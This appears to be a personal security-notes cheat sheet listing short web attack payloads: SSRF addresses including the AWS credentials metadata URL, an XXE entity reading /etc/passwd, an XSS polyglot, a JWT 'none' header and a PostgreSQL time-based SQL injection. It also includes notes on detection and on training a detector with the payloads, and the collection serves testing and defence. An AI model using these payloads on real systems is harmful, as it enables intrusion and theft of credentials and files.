# Context-Specific Payloads Vault

## Overview
A curated collection of context-specific payloads for testing various vulnerability classes. These are abstract, engineered examples used strictly for educational, research, and authorized testing purposes.

## Real-World Usage
Generic payloads rarely work in production environments due to WAFs (Web Application Firewalls) and context-specific sanitization. These payloads represent the *foundational* logic that must be encoded, mutated, and adapted based on the specific framework (Node.js vs Spring) and deployment architecture.

## Server-Side Request Forgery (SSRF)
Targeting internal services and bypassing naive filters.
- **Localhost Variations:**
  ```text
  http://127.0.0.1
  http://0.0.0.0
  http://localhost
  http://[::1]
  http://2130706433 (Decimal representation)
  http://0x7F000001 (Hex representation)
  ```
- **Cloud Metadata (AWS):**
  ```text
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
  ```

## XML External Entity (XXE)
- **Classic Local File Inclusion (LFI):**
  ```xml
  <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <data>&xxe;</data>
  ```

## Cross-Site Scripting (XSS)
- **Polyglot Payload (Context-agnostic):**
  ```javascript
  javascript://%250Aalert(1)//"onclick=alert(1)//<svg/onload=alert(1)>
  ```

## JSON Web Tokens (JWT)
- **The 'None' Algorithm Header:**
  ```text
  eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
  ```
  *(Decodes to: `{"alg":"none","typ":"JWT"}`)*

## SQL Injection (PostgreSQL Context)
- **Time-based Blind:** 
  ```sql
  1; SELECT pg_sleep(5)--
  ```

## Attacker Mindset
- **Exploitation Goals:** Attackers don't just use payloads; they test application reactions to specific payload segments to map out exactly what WAF or sanitization library is in place, then craft a payload to specifically evade it.

## Detection Opportunities
- **Logging Indicators:** Monitor logs for decoding errors or unusual character encodings. For instance, double-URL encoded characters often indicate an attempt to bypass frontend WAFs.

## Project Connections
- **AI Guardian Engine:** I utilized variations of these XSS and SQLi payloads to train the NLP heuristic detection engine to identify and flag malicious input structures.
- **SecurePass Analyzer:** Relates to credential security; observing SQL injection payloads underscores why password security and proper database hashing architectures are vital.

## References
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [SecLists](https://github.com/danielmiessler/SecLists)